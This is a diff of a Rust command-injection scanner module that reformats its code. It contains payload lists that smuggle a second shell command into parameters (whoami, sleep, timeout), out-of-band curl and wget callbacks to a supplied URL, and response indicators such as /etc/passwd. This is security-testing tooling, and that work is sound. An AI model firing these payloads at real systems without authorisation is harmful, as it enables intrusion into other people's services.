@@ -48,42 +48,19 @@ const ERROR_PAYLOADS_UNIX: &[&str] = &[
 ];
 
 // Error-based payloads — Windows
-const ERROR_PAYLOADS_WIN: &[&str] = &[
-    "& whoami",
-    "| whoami",
-    "&& whoami",
-];
+const ERROR_PAYLOADS_WIN: &[&str] = &["& whoami", "| whoami", "&& whoami"];
 
 // Time-based payloads — Unix
-const TIME_PAYLOADS_UNIX: &[&str] = &[
-    "; sleep 5",
-    "| sleep 5",
-    "&& sleep 5",
-    "$(sleep 5)",
-];
+const TIME_PAYLOADS_UNIX: &[&str] = &["; sleep 5", "| sleep 5", "&& sleep 5", "$(sleep 5)"];
 
 // Time-based payloads — Windows
-const TIME_PAYLOADS_WIN: &[&str] = &[
-    "& timeout /t 5",
-    "| timeout /t 5",
-];
+const TIME_PAYLOADS_WIN: &[&str] = &["& timeout /t 5", "| timeout /t 5"];
 
 // Strings in response body that indicate Unix command execution
-const ERROR_INDICATORS_UNIX: &[&str] = &[
-    "uid=",
-    "root:",
-    "daemon:",
-    "/bin/sh",
-    "/etc/passwd",
-];
+const ERROR_INDICATORS_UNIX: &[&str] = &["uid=", "root:", "daemon:", "/bin/sh", "/etc/passwd"];
 
 // Strings in response body that indicate Windows command execution
-const ERROR_INDICATORS_WIN: &[&str] = &[
-    "WINDOWS\\",
-    "NT AUTHORITY",
-    "System32",
-    "Users\\",
-];
+const ERROR_INDICATORS_WIN: &[&str] = &["WINDOWS\\", "NT AUTHORITY", "System32", "Users\\"];
 
 // ── CLI ──────────────────────────────────────────────────────────────────────
 
@@ -217,9 +194,7 @@ fn now_rfc3339() -> String {
 
 // Sanitize a timestamp string for use in a filename (colons → underscores)
 fn ts_for_filename(ts: &str) -> String {
-    ts.chars()
-        .map(|c| if c == ':' { '_' } else { c })
-        .collect()
+    ts.chars().map(|c| if c == ':' { '_' } else { c }).collect()
 }
 
 // Collect injectable points from crawl host directories
@@ -443,7 +418,10 @@ pub async fn run(args: Args) -> Result<()> {
         .context("build HTTP client")?;
 
     // Build effective error-payload list, appending OOB payloads if requested
-    let oob_token = args.oob_url.as_ref().map(|_| format!("cmdi-{:08x}", std::process::id()));
+    let oob_token = args
+        .oob_url
+        .as_ref()
+        .map(|_| format!("cmdi-{:08x}", std::process::id()));
     let mut all_error_payloads: Vec<String> = ERROR_PAYLOADS_UNIX
         .iter()
         .chain(ERROR_PAYLOADS_WIN.iter())
@@ -452,9 +430,7 @@ pub async fn run(args: Args) -> Result<()> {
 
     if let (Some(oob_url), Some(token)) = (&args.oob_url, &oob_token) {
         all_error_payloads.push(format!("; curl {oob_url}/{token}"));
-        all_error_payloads.push(format!(
-            "| wget {oob_url}/{token} -q -O /dev/null"
-        ));
+        all_error_payloads.push(format!("| wget {oob_url}/{token} -q -O /dev/null"));
     }
 
     // ── Error-based probes (concurrent) ──────────────────────────────────────
@@ -568,7 +544,11 @@ pub async fn run(args: Args) -> Result<()> {
     );
 
     // Write findings for confirmed error-based command injection
-    for r in output.error_results.iter().filter(|r| r.verdict == ErrorVerdict::Confirmed) {
+    for r in output
+        .error_results
+        .iter()
+        .filter(|r| r.verdict == ErrorVerdict::Confirmed)
+    {
         let tf = ToolFinding::new("mg-cmdinject", "OS Command Injection (Error-Based)", FindingSeverity::High)
             .url(r.url.clone())
             .parameter(r.param.clone())
@@ -577,7 +557,11 @@ pub async fn run(args: Args) -> Result<()> {
         let _ = write_finding(&eng, &tf);
     }
     // Write findings for confirmed time-based command injection
-    for r in output.time_results.iter().filter(|r| r.verdict == TimeVerdict::Confirmed) {
+    for r in output
+        .time_results
+        .iter()
+        .filter(|r| r.verdict == TimeVerdict::Confirmed)
+    {
         let tf = ToolFinding::new("mg-cmdinject", "OS Command Injection (Time-Based Blind)", FindingSeverity::High)
             .url(r.url.clone())
             .parameter(r.param.clone())
@@ -612,7 +596,8 @@ mod tests {
 
     #[test]
     fn detect_indicator_finds_unix_passwd() {
-        let body = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";
+        let body =
+            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";
         assert!(detect_indicator(body).is_some());
     }
 
@@ -637,7 +622,10 @@ mod tests {
 
     #[test]
     fn ts_for_filename_replaces_colons() {
-        assert_eq!(ts_for_filename("2026-05-17T12:00:00Z"), "2026-05-17T12_00_00Z");
+        assert_eq!(
+            ts_for_filename("2026-05-17T12:00:00Z"),
+            "2026-05-17T12_00_00Z"
+        );
     }
 
     #[test]
